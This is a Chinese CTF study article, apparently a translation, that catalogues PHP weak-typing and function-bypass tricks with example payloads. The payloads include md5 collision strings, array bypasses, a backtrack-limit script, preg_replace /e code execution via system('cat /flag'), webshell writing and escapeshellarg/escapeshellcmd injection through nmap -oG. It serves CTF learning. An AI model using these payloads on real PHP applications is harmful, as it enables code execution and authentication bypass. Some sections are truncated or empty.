# CTF/PHP特性汇总
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言：
做CTF题时经常会遇到各种php弱类型和一些函数的绕过方法，由于知识比较零碎，就总结一下我所遇到的，也方便自己以后观看。
## 0x00:Hash比较缺陷
>
> `PHP`在处理哈希字符串时，通过`!=`或`==`来对哈希值进行比较，它把每一个以`0e`开头的哈希值都解释为`0`，所以如果两个不同的密码经过哈希以后，其哈希值都是以`0e`开头的，那么`PHP`将会认为他们相同，都是`0`
审计代码，我们输入的不能相等，但`md5`却需要相等，这明显的就是利用`Hash`的比较缺陷来做
我们只要找出两个数再`md5`加密后都为`0e`开头的即可，常用的有以下几种
    QNKCDZO
    0e830400451993494058024219903391
    s878926199a
    0e545993274517709034328855841020
    s155964671a
    0e342768416822451524974117254469
    s214587387a
    0e848240448830537924465865611904
    s214587387a
    0e848240448830537924465865611904
    s878926199a
    0e545993274517709034328855841020
    s1091221200a
    0e940624217856561557816327384675
所以构造`a=QNKCDZO&b=s878926199a`即可绕过
## 0x01:md5
####  第一种：md5函数绕过
> 一、`md5()`函数获取不到数组的值，默认数组为0  
>  二、`sha1()`函数无法处理数组类型，将报错并返回false
payload：
    name[]=1&password[]=2
注意这里是`===`，不是`==`，所以这里采用`md5()`函数获取不到数组的值，默认数组为0这个特性来做，payload:
    username[]=1&password[]=2
####  第二种：md5强类型绕过
    (string)$_POST['a1']!==(string)$_POST['a2']
     && md5($_POST['a1'])===md5($_POST['a2'])}
例如这段代码，使用数组就不可行，因为最后转为字符串进行比较，所以只能构造两个MD5值相同的不同字符串.  
两组经过url编码后的值
    #1
    a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
    b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
    #2
    a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
    b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%
## 0x03:intval函数绕过
####  第一个特性：
####  第二个特性：
例如：
payload如下:
    ?num=0x117c
    ?num=010574
除此之外，这个函数还可以使用小数点来进行操作
####  第三个特性：
> 如果$base为0直到遇上数字或正负符号才开始做转换，在遇到非数字或字符串结束时(\0)结束转换，但前提是进行弱类型比较
例如：
payload：
    ?num=4476e1
## 0x04:preg_match函数绕过
####  第一种：/m
    if(preg_match('/^php$/im',$a))
> /m 多行匹配，但是当出现换行符 `%0a`的时候，会被当做两行处理，而此时只可以匹配第 1 行，后面的行就会被忽略。
####  第二种：回溯绕过
PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit,可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限
回溯次数上限默认是100万,如果回溯次数超过了100万，preg_match返回的 **便不再是0或1，而是false**
，利用这个方法，可以写一个脚本，来使回溯次数超出pcre.backtrack_limit限制，进而绕过WAF
    import requests
    url = 'http://3638bf4e-f63d-477c-95eb-ba023f279de8.chall.ctf.show:8080/'
    data = {
        'f':'very'*250000+'ctfshow'
    }
    reponse = requests.post(url,data=data)
    print(reponse.text)
## 0x05: preg_replace /e 模式下的代码执行
> /e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行
**ZJCTF，不过如此**
     $str) {
        echo complex($re, $str). "\n";
    }
    function getFlag(){
        @eval($_GET['cmd']);
    }
这里的代码便涉及到了preg_replace /e 模式下的代码执行，原理的话师傅讲的很明白，这里不再叙述
**直接放payload：**
    \S*=${phpinfo()}
**得到flag**
    ?\S*=${eval(getFlag())}&cmd=system('cat /flag');
    #最后的分号要加，除此之外，也可以：
    ?\S*=${eval($_POST[lemon])}
    #POST DATA
    lemon=system('cat /flag');
## 0x06：in_array宽松比较
in_array函数有一个特性 **，** 如果不设置第三个参数将使用宽松的比较
可以在本地测试一下
例如这道题：
上面的代码对下面无影响，直接写webshell即可，但是要注意文件名开头必须是以数字开头的
    ?n=1.php
    DATA:
    content=
## 0x07:变量覆盖
####  第一种：extract函数、parse_str函数
> `extract()` 函数使用 **数组键名** 作为 **变量名** ，使用 **数组键值** 作为 **变量值**
> ，当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖
`POST`方法传输进来的值通过`extrace()`函数处理，直接传入以`POST`的方式传入`pass=1&thepassword_123=1`就可以进行将原本的变量覆盖，并且使两个变量相等即可。
还有就是这两个函数如果结合起来使用，也会造成变量覆盖
代码中同时含有`parse_str和extract($_POST)`可以先将GET方法请求的解析成变量，然后再利用extract()
函数从数组中将变量导入到当前的符号表,故payload为：
    ?_POST[key1]=36d&_POST[key2]=36d
####  第二种：$$变量覆盖
$$变量覆盖要具体结合代码来看，可能会需要借助 **某个参数进行传递值** ，也有可能使用 **$GLOBALS（引用全局作用域中可用的全部变量）**
来做题，例如：
这道题便需要借助某个参数进行传递值，具体也不详细说明了，payload如下：
    ?Sn0w=flag
    DATA:
    error=Sn0w
    实际在代码中为
    GET:
    $Sn0w=$flag
    POST:
    $error=$Sn0w
## 0x08:通过数组绕过
####  ereg()函数
> 一、ereg()函数存在NULL截断漏洞,可以%00截断，遇到%00则默认为字符串的结束，所以可以绕过一些正则表达式的检查。  
>  二、ereg()只能处理字符串的，遇到数组做参数返回NULL。  
>  三、空字符串的类型是`string`，`NULL`的类型是`NULL`,`false、true`是`boolean`类型
####  strpos()函数
> strpos()函数如果传入数组，便会返回NULL
####  strcmp()函数
`strcmp()`函数比较两个字符串(区分大小写）,定义中是比较 **字符串类型**
的，但如果输入其他类型这个函数将发生错误，在官方文档的说明中说到在`php
5.2`版本之前，利用`strcmp`函数将数组与字符串进行比较会返回`-1`，但是从`5.3`开始，会返回`0`。
payload:
    #POST DATA
    pass[]=1
数组和字符进行比较结果不会返回`1`，即为`false`,加上非的作用，即可变成`true`,则满足条件
## 0x09：PHP自身特性
####  PHP的变量名格式
**在CTF中也经常考察PHP的变量名格式，例如这道题：**
`$_POST['CTF_SHOW.COM']`无法传入参数，这是因为PHP变量名应该只有 **数字字母下划线。**
而且GET或POST方式传进去的变量名,会自动将`**空格**` `+ . [`转换为`_`
payload:
    DATA:
    CTF_SHOW=1&CTF[SHOW.COM=1
####  PHP数字可与字符做运算
## 0x10：escapeshellarg&escapeshellcmd函数绕过
模仿师傅的例子进行学习  
[谈谈escapeshellarg参数绕过和注入的问题](http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/)
**escapeshellarg**
**escapeshellcmd**
先通过例子来查看一下 **escapeshellarg** 函数的作用吧
在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。
所以即使参数用了 **escapeshellarg** 函数过滤单引号，但参数在拼接命令的时候如果用了双引号的话还是会导致命令执行的漏洞。
再来看一下 **escapeshellcmd** 函数的作用
两个函数都会对单引号进行处理，但是有区别的,如下：
对于单个单引号, **escapeshellarg** 函数转义后,还会在左右各加一个单引号,但 **escapeshellcmd**
函数是直接加一个转义符，对于成对的单引号, **escapeshellcmd** 函数默认不转义,但 **escapeshellarg** 函数转义
那既然有这个差异，如果 **escapeshellcmd()** 和 **escapeshellarg()** 一起出现会有什么问题  
 **测试**
**结果**
**分析**
    一开始传入的参数
    127.0.0.1' -v -d a=1
    经过escapeshellarg函数处理，先转义再用单引号括起来
    '127.0.0.1'\'' -v -d a=1'
    再经过escapeshellcmd函数处理，数中的\以及a=1'中的单引号进行处理转义
    '127.0.0.1'\\'' -v -d a=1\'
    由于这一步的处理，使得\\被解释成了\而不再是转义字符，所以单引号配对连接之后将语句分割为三个部分
因此最后system函数是对`127.0.0.1\`发起请求，POST 数据为`a=1'`，如果两个函数翻过来则不会出现这个问题
接下来就通过一个题目来实践一下：
**Online Tool**
代码中是先使用了 **escapeshellarg** 函数，再使用 **escapeshellcmd**
函数便会引发上面的问题,再来仔细观察一下代码，发现`mkdir\chadir`函数，创建目录和改变当前的目录，应该是要我们写文件进去的，`system()`函数又是一串namp命令后面拼接上GET传入的参数，因为参数经过了上面的参数处理，`；`等都会被转义，所以就要从拼接的namp命令想办法了，查了百度谷歌没查到，看了WP才知道
> nmap命令中 参数`-oG`可以实现将命令和结果写到文件（也就是可以写木马）
接下来就写payload，`escapeshellarg`函数会先对host变量中的单引号进行转义，并且转义之后，在 `\'` 的左右两边再加上单引号，变成
`'\''`
然后`escapeshellcmd`函数，会对host变量中的特殊字符进行转义
> （&#;`|*?~<>^()[]{}$, \x0A//和\xFF以及不配对的单/双引号转义）
那么上面的 `\` 就会被再次转义，比如变成 `'\\''`  
如果在字符串首尾加上单引号，经过`escapeshellarg`函数之后，就可以实现将单引号给闭合了，在经过`escapeshellcmd`函数的时候单引号就是配对的，就不会进行转义
如：
    ' lemon shy '